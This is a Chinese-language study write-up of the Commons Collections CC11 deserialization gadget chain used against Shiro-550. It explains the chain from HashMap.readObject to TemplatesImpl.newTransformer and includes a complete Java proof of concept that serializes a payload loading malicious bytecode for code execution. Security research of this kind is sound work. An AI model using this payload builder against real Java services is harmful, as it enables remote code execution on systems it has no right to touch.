CommonsCollections11链分析

2023-03-19 · 5 min · Reus09
Table of Contents
  • 前提知识
  • 利用过程
  • 总结

今天学习了Shiro-550漏洞的原理，看到通过Gadget使用CC6链会因为Shiro执行反序列化的时候，只能反序列化原生的类型的Object Array，CC6中的ChainTransformer本质是一个Transformer类型的数组，无法被序列化，这时候文章提到了大杀器CC11。

同时，这里也回顾一下之前CC1-CC7七条链。

  • 第一种是CC1和CC6,核心是通过ChainTransformer.tranform方法链式调用构造好的ConstantTransformer.tranform和InvokerTransformer.transform方法，实现命令执行
  • 第二类是以CC3为例的通过调用TemplatesImpl.newTransform方法实现加载字节码的方式实现代码执行

CC2是CC1和CC4的结合，前半部分用CC4的入口,触发TransformingComparator.compare方法中的transformer，将transformer定义为InvokeTransformer即可执行TemplateImpl.newTransformer()方法。

CC11像是把CC2的入口改为了CC6，从上图可以看出CC6会调用到LazyMap.get方法后待用传入的Transformer对象的transform方法，CC6是接上了CC1走ChainTransformer.tranform方法进行链式调用，而CC11是接上了CC2，走InvokerTransformer.transform方法去调用TemplateImpl.newTransform方法去实现加载字节码造成代码执行，同时只使用InvokeTransfomer保证了可以被Shiro反序列。

前提知识#

因为CC11相当于是CC2和CC6的组合，大部分知识点是重复的，这里就以触发点介绍最重要的。

HashMap的反序列化执行readObject时会对key执行hash，java.util.HashMap#hash方法实际执行了key的hashcode方法。

TiedMapEntry类在执行hashcode方法时，会调用getValue()方法，getValue()方法实际上也会调用自身map的get方法，同时它自身存在一个可被赋值的变量key。

利用过程#

实际上将利用了LazyMap的get方法，会对传递进来的参数key，调用自身的factory的transform方法。

我们可以看到key是一个Object类型的参数，那么我们如果能够控制key，将其赋值为一个TemplatesImpl类型的参数，同时将factory通过反射指定为InvokeTransform，并且执行的方法为newTransformer，那么我们即可实现代码执行。

那么lazymap.get(key)，key是从哪里获取的，对于TiedMapEntry类来说，初始化，需要传递两个参数map,key，并且在它的getValue方法中就实现了调用map的get方法,参数为初始化时的key，只需要反射将key赋值为TemplatesImpl即可。

getValue在往上这条链是属于CC6这条链的前半段，就不在赘述了。

利用链很清晰，TiedMapEntry封装好一个lazyMap，其factory初始化为InvokeTransformer，执行toString方法，然后通过反射，将InvokeTransformer将对应的iMethodName修改为newTransformer,通过反射将key赋值为构造好的TemplatesImpl类。

public class CC11 {
    public static void setFieldValue(Object obj, String fieldNmae, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldNmae);
        field.setAccessible(true);
        field.set(obj,value);
    }

    public static void main(String[] args) throws Exception {

        // 构造恶意 TemplatesImpl 对象
        TemplatesImpl obj = new TemplatesImpl();
        // 获取恶意类的字节码
        byte[] code = Files.readAllBytes(Paths.get("/EvilClass.class"));
        byte[][] codes = {code};
        // 反射修改属性
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        // ================
        // 利用 InvokerTransformer 调用 TemplatesImpl.newTransformer

        // tostrng
        InvokerTransformer invokertransformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        //===============
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, invokertransformer);
        TiedMapEntry tme = new TiedMapEntry(outerMap,"reus09");
        Map expMap = new HashMap();
        expMap.put(tme, "reus09");
        innerMap.remove(obj);

        setFieldValue(invokertransformer, "iMethodName","newTransformer" );
        setFieldValue(tme,"key",obj);
        // ==============
        // 生成序列化字符串

        ObjectOutputStream oss = new ObjectOutputStream(new FileOutputStream("./cc11.bin"));
        oss.writeObject(expMap);
        oss.close();

        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("./cc11.bin"));
        Object o = (Object) ois.readObject();
    }
}

实现弹窗

总结#

CC11被叫做是CC2+CC6链的结合体，这里学习主要作为Shiro-550的Gadget，将ChainedTransformer数组精简为InvokeTransformer。能够像 cc2 一样加载恶意字节码，同时受影响的版本还是 CommonsCollections 3.1-3.2.1 这个版本相对 CommonsCollections 4.0 范围会更广一些。

  1. Gadget 总结：
    • kick-off gadget：java.util.HashMap#readObject()
    • sink gadget：com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer()
    • chain gadget：org.apache.commons.collections.functors.InvokeTransformer#transform()
